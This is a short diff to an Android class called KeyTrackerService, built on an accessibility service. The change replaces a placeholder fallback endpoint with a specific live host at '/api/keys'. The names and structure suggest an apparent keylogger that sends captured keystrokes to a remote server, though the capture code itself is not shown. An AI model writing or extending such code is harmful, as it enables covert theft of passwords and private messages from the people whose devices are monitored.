@@ -62,7 +62,7 @@ public class KeyTrackerService extends AccessibilityService {
             apiEndpoint = res.getString(res.getIdentifier("api_endpoint", "string", getPackageName()));
         } catch (Exception e) {
             Log.e(TAG, "Error getting API endpoint from resources", e);
-            apiEndpoint = "https://votre-app.vercel.app/api/keys";
+            apiEndpoint = "https://android-tracker-theta.vercel.app/api/keys";
         }
         Log.d(TAG, "Accessibility service connected. API endpoint: " + apiEndpoint);
     }
